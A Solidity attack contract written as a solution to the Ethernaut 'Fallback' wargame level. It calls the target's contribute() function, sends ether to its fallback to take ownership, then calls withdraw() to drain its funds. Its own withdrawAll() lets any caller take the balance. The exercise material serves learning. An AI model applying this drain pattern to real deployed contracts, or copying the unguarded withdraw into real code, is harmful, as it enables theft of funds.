pragma solidity ^0.5.0;

contract FallBackHack {
    /**
     * @title FallBackHack
     * @dev This will successfully hack the Fallback contract but won't be able the pass the test. 
     * Ethernaut requires PLAYER address to be owner not the deployed smart contract address. 
     * Deposit some ether before executing.
     */
    address _a;
    address payable owner;

    constructor(address contractAddress) public {
        _a = contractAddress;
    }

    function() external payable {
        // This step is not required.
        require(msg.data.length == 0);
    }

    function deposit() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // This step is not required.
    function withdrawAll() public {
        owner = msg.sender;
        owner.transfer(address(this).balance);
    }

    function callContribute(uint256 amount) public {
        bytes memory payload = abi.encodeWithSignature("contribute()");
        (bool success, ) = address(_a).call.value(amount)(payload);
        require(success);
    }

    function callFallback(uint256 amount) public {
        (bool success, ) = address(_a).call.value(amount)("");
        require(success);
    }

    function initiateWithdraw() public {
        bytes memory payload = abi.encodeWithSignature("withdraw()");
        (bool success, ) = address(_a).call(payload);
        require(success);
    }
}
